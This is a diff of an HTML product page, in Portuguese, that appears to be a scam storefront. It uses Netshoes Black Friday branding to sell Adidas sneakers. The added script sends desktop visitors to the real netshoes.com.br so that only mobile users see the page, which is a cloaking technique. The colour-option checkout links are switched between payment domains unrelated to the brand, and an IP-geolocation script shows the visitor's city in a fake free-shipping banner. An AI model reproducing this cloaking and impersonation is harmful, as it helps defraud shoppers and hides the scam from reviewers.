@@ -31,13 +31,30 @@
         data-utmify-prevent-subids async defer></script>
 
 
+
+    <script type="text/javascript">
+        //digite a url de redirect
+        var url_link_redirect_pc = "https://www.netshoes.com.br/";
+
+        //function js
+        function isMobile() {
+            const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+            return regex.test(navigator.userAgent);
+        }
+
+        //validation js
+        if (isMobile()) { console.log("Mobile device detected"); } else {
+            window.location = url_link_redirect_pc;
+        }
+    </script>
+
 </head>
 
 <body>
 
     <div class="main-header-container">
         <div class="main-header">
-            <a href="https://tela-o-certo.vercel.app/collections/produtos-selecionados-maratona-de-descontos.html"
+            <a href="https://seguro.nobrecobertores.store/api/public/shopify?product=1607843333715&store=16078"
                 class="voltar-link">
                 <svg aria-hidden="true" class="arrow-left-icon" viewbox="0 0 448 512"
                     xmlns="http://www.w3.org/2000/svg">
@@ -47,7 +64,7 @@
                 </svg>
                 <b style="font-size: 14px; font-weight: 500;">Voltar</b>
             </a>
-            <a href="https://tela-o-certo.vercel.app/collections/produtos-selecionados-maratona-de-descontos.html"
+            <a href="https://seguro.nobrecobertores.store/api/public/shopify?product=1607843333715&store=16078"
                 class="logo-link">
                 <img src="images/logo.png" alt="Logo da Loja" class="logo-img">
             </a>
@@ -62,151 +79,122 @@
         </div>
     </div>
 
-    <!-- ========== FAIXA DE ENVIO POR CIDADE (CUSTOM LIQUID) ========== -->
-    <div id="geo-shipbar" class="geo-shipbar" role="region" aria-label="Destino de envio">
-        <span class="geo-shipbar__left">
-            <!-- Ícone de localização (SVG inline) -->
-            <svg class="geo-shipbar__icon" viewBox="0 0 24 24" aria-hidden="true">
-                <path
-                    d="M12 2C8.686 2 6 4.686 6 8c0 5.25 6 12 6 12s6-6.75 6-12c0-3.314-2.686-6-6-6zm0 8.5A2.5 2.5 0 1 1 12 5a2.5 2.5 0 0 1 0 5.5z" />
-            </svg>
-            <span class="geo-shipbar__text">
-                Frete grátis para:
-                <strong class="geo-shipbar__city" data-city>detectando…</strong>
-                e região.</span>
-        </span>
-        <span class="geo-shipbar__chev" aria-hidden="true">›</span>
-    </div>
+<!-- ========== FAIXA DE ENVIO POR CIDADE (CUSTOM LIQUID) ========== -->
+<div id="geo-shipbar" class="geo-shipbar" role="region" aria-label="Destino de envio">
+  <span class="geo-shipbar__left">
+    <!-- Ícone de localização (SVG inline) -->
+    <svg class="geo-shipbar__icon" viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 2C8.686 2 6 4.686 6 8c0 5.25 6 12 6 12s6-6.75 6-12c0-3.314-2.686-6-6-6zm0 8.5A2.5 2.5 0 1 1 12 5a2.5 2.5 0 0 1 0 5.5z"/>
+    </svg>
+    <span class="geo-shipbar__text">
+      Frete grátis para:
+      <strong class="geo-shipbar__city" data-city>detectando…</strong>
+    e região.</span>
+  </span>
+  <span class="geo-shipbar__chev" aria-hidden="true">›</span>
+</div>
 
-    <style>
-        .geo-shipbar {
-            --bar-bg: #8201FF;
-            /* cor da faixa */
-            --bar-txt: #fff;
-            /* cor do texto/ícones */
-            --bar-height: 44px;
-            /* altura da faixa */
-            --bar-radius: 8px;
-            /* arredondamento */
-            --maxw: 1200px;
-            /* largura máxima opcional */
-            --padding-x: 14px;
-            /* padding horizontal */
+<style>
+  .geo-shipbar{
+    --bar-bg:#8201FF;         /* cor da faixa */
+    --bar-txt:#fff;           /* cor do texto/ícones */
+    --bar-height:44px;        /* altura da faixa */
+    --bar-radius:8px;         /* arredondamento */
+    --maxw:1200px;            /* largura máxima opcional */
+    --padding-x:14px;         /* padding horizontal */
 
-            background: var(--bar-bg);
-            color: var(--bar-txt);
-            height: var(--bar-height);
-            line-height: var(--bar-height);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 var(--padding-x);
-            margin-top: 1px;
-            max-width: var(--maxw);
-            box-shadow: 0 4px 10px rgba(0, 0, 0, .08);
-            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
-            user-select: none;
-        }
+    background:var(--bar-bg);
+    color:var(--bar-txt);
+    height:var(--bar-height);
+    line-height:var(--bar-height);
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 var(--padding-x);
+    margin-top:1px;
+    max-width:var(--maxw);
+    box-shadow:0 4px 10px rgba(0,0,0,.08);
+    font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
+    user-select:none;
+  }
+  .geo-shipbar__left{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    min-width:0;
+  }
+  .geo-shipbar__icon{
+    width:18px; height:18px; flex:0 0 18px; fill:currentColor; opacity:.95;
+  }
+  .geo-shipbar__text{
+    font-size:.95rem; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+  }
+  .geo-shipbar__city{
+    font-weight:700; text-decoration:underline; text-underline-offset:2px;
+  }
+  .geo-shipbar__chev{
+    font-size:22px; opacity:.9;
+  }
+  @media (max-width:480px){
+    .geo-shipbar{ --bar-height:42px; --padding-x:12px; }
+    .geo-shipbar__text{ font-size:12px; }
+  }
+</style>
 
-        .geo-shipbar__left {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            min-width: 0;
-        }
+<script>
+(function(){
+  const cityEl = document.querySelector('#geo-shipbar [data-city]');
+  if(!cityEl) return;
 
-        .geo-shipbar__icon {
-            width: 18px;
-            height: 18px;
-            flex: 0 0 18px;
-            fill: currentColor;
-            opacity: .95;
-        }
+  const LS_KEY = 'geo_city_name_v1';
+  const FALLBACK_LABEL = 'sua região';
 
-        .geo-shipbar__text {
-            font-size: .95rem;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
+  const setCity = (name) => {
+    const city = (name || '').toString().trim();
+    if (city) {
+      localStorage.setItem(LS_KEY, city);
+      cityEl.textContent = city;
+    } else {
+      cityEl.textContent = FALLBACK_LABEL;
+    }
+  };
 
-        .geo-shipbar__city {
-            font-weight: 700;
-            text-decoration: underline;
-            text-underline-offset: 2px;
-        }
+  // 1) Usa cache se existir (instantâneo)
+  const cached = localStorage.getItem(LS_KEY);
+  if (cached) setCity(cached);
 
-        .geo-shipbar__chev {
-            font-size: 22px;
-            opacity: .9;
-        }
+  // Helper para fetch com timeout
+  const fetchWithTimeout = (url, ms=4500) => {
+    const controller = new AbortController();
+    const t = setTimeout(()=>controller.abort(), ms);
+    return fetch(url, {signal: controller.signal})
+      .finally(()=>clearTimeout(t));
+  };
 
-        @media (max-width:480px) {
-            .geo-shipbar {
-                --bar-height: 42px;
-                --padding-x: 12px;
-            }
-
-            .geo-shipbar__text {
-                font-size: 12px;
-            }
-        }
-    </style>
-
-    <script>
-        (function () {
-            const cityEl = document.querySelector('#geo-shipbar [data-city]');
-            if (!cityEl) return;
-
-            const LS_KEY = 'geo_city_name_v1';
-            const FALLBACK_LABEL = 'sua região';
-
-            const setCity = (name) => {
-                const city = (name || '').toString().trim();
-                if (city) {
-                    localStorage.setItem(LS_KEY, city);
-                    cityEl.textContent = city;
-                } else {
-                    cityEl.textContent = FALLBACK_LABEL;
-                }
-            };
-
-            // 1) Usa cache se existir (instantâneo)
-            const cached = localStorage.getItem(LS_KEY);
-            if (cached) setCity(cached);
-
-            // Helper para fetch com timeout
-            const fetchWithTimeout = (url, ms = 4500) => {
-                const controller = new AbortController();
-                const t = setTimeout(() => controller.abort(), ms);
-                return fetch(url, { signal: controller.signal })
-                    .finally(() => clearTimeout(t));
-            };
-
-            // 2) Tenta ipapi.co (boa qualidade + CORS liberado)
-            fetchWithTimeout('https://ipapi.co/json/')
-                .then(r => r.ok ? r.json() : Promise.reject('ipapi.co not ok'))
-                .then(data => {
-                    if (data && (data.city || data.region)) {
-                        setCity(data.city || data.region);
-                        return; // sucesso
-                    }
-                    throw new Error('ipapi.co no city');
-                })
-                .catch(() => {
-                    // 3) Fallback: ipwho.is (sem token, CORS liberado)
-                    fetchWithTimeout('https://ipwho.is/')
-                        .then(r => r.ok ? r.json() : Promise.reject('ipwho.is not ok'))
-                        .then(data => setCity(data.city || data.region || data.country))
-                        .catch(() => {
-                            // 4) Último recurso: mantém cache (se havia) ou fallback genérico
-                            if (!cached) setCity('');
-                        });
-                });
-        })();
-    </script>
-    <!-- ========== /FAIXA DE ENVIO POR CIDADE ========== -->
-
+  // 2) Tenta ipapi.co (boa qualidade + CORS liberado)
+  fetchWithTimeout('https://ipapi.co/json/')
+    .then(r => r.ok ? r.json() : Promise.reject('ipapi.co not ok'))
+    .then(data => {
+      if (data && (data.city || data.region)) {
+        setCity(data.city || data.region);
+        return; // sucesso
+      }
+      throw new Error('ipapi.co no city');
+    })
+    .catch(() => {
+      // 3) Fallback: ipwho.is (sem token, CORS liberado)
+      fetchWithTimeout('https://ipwho.is/')
+        .then(r => r.ok ? r.json() : Promise.reject('ipwho.is not ok'))
+        .then(data => setCity(data.city || data.region || data.country))
+        .catch(() => {
+          // 4) Último recurso: mantém cache (se havia) ou fallback genérico
+          if (!cached) setCity('');
+        });
+    });
+})();
+</script>
+<!-- ========== /FAIXA DE ENVIO POR CIDADE ========== -->
+    
     <div class="product-container">
         <div class="left-column">
             <div style="margin-top: 5px;" class="product-stats div-mobile">
@@ -214,7 +202,7 @@
                 <span class="rating-1 div-mobile" onclick="scrollToOpinions()" style="cursor: pointer;">4.8 <b
                         style="color: #ffc408">★ ★ ★ ★ ★</b> (1718)</span>
             </div>
-
+        
             <img src="images/1.webp" class="product-image" id="mainImage">
             <div class="thumbnail-gallery">
                 <div class="thumbnail-gallery-container">
@@ -387,13 +375,13 @@
             </script>
         </div>
 
-        <h1 class="product-title div-mobile">Tênis Adidas Brand 2.0 + Brinde (Oferta Relâmpago)<svg
-                class="verified-icon" viewbox="0 0 20 20" fill="currentColor">
-                <path fill-rule="evenodd"
-                    d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
-                    clip-rule="evenodd"></path>
-            </svg></h1>
-
+<h1 class="product-title div-mobile">Tênis Adidas Brand 2.0 + Brinde (Oferta Relâmpago)<svg
+                    class="verified-icon" viewbox="0 0 20 20" fill="currentColor">
+                    <path fill-rule="evenodd"
+                        d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                        clip-rule="evenodd"></path>
+                </svg></h1>
+        
         <div class="right-column">
             <div class="product-info-container">
                 <span class="offer-badge-pc offer-badge">ESQUENTA BLACK FRIDAY NETSHOES 🔥</span>
@@ -404,31 +392,31 @@
                     <h4 class="variation-title">Cor: <span id="selectedColor">Branco</span></h4>
                     <div class="variation-options">
                         <label class="variation-option active" data-color="Branco"
-                            data-link="https://pay.paguesegura.online/pay/53b65b89-ecea-4c19-8c8a-2d3a69d39b92">
+                            data-link="https://seguro.nobrecobertores.store/api/public/shopify?product=1607843333715&store=16078">
                             <input type="radio" name="color" value="branco" checked="">
                             <img src="images/1.webp" alt="Branco" class="variation-image">
                             <span class="variation-name">Branco</span>
                         </label>
                         <label class="variation-option" data-color="Azul"
-                            data-link="https://pay.paguesegura.online/pay/632f3651-9f4a-46d8-8448-a203bff48753">
+                            data-link="https://seguro.nobrecobertores.store/api/public/shopify?product=1607892432381&store=16078">
                             <input type="radio" name="color" value="azul">
                             <img src="images/2.webp" alt="Azul" class="variation-image">
                             <span class="variation-name">Azul</span>
                         </label>
                         <label class="variation-option" data-color="Preto"
-                            data-link="https://pay.paguesegura.online/pay/da427ec7-8936-468f-8534-ee77efdd3a3e">
+                            data-link="https://seguro.nobrecobertores.store/api/public/shopify?product=1607887342343&store=16078">
                             <input type="radio" name="color" value="preto">
                             <img src="images/3.webp" alt="Preto" class="variation-image">
                             <span class="variation-name">Preto</span>
                         </label>
                         <label class="variation-option" data-color="Azul e Branco"
-                            data-link="https://pay.paguesegura.online/pay/c76d7a23-ebfe-4c8d-88b1-fba31db3ad64">
+                            data-link="https://seguro.nobrecobertores.store/api/public/shopify?product=1607873631893&store=16078">
                             <input type="radio" name="color" value="azul-branco">
                             <img src="images/4.webp" alt="Azul e Branco" class="variation-image">
                             <span class="variation-name">Azul e Branco</span>
                         </label>
                         <label class="variation-option" data-color="Cinza"
-                            data-link="https://pay.paguesegura.online/pay/bf86f680-abc7-42f7-acab-bb1bab0bf30c">
+                            data-link="https://seguro.nobrecobertores.store/api/public/shopify?product=1607885535795&store=16078">
                             <input type="radio" name="color" value="cinza">
                             <img src="images/5.webp" alt="Cinza" class="variation-image">
                             <span class="variation-name">Cinza</span>
